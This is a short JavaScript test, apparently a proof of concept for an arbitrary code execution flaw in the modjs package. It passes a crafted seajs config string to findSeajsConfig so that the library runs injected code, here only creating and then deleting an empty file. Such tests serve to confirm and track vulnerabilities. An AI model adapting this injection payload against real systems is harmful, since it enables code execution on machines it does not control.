//
test("Arbitrary code execution in modjs", () => {
  const fs = require("fs");
  const sea = require("modjs/lib/utils/sea");
  const path = "./modjs";

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  try {
    sea.findSeajsConfig(
      "seajs.config({a: require('fs').writeFileSync('./modjs', '')})"
    );
  } catch (error) {}

  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
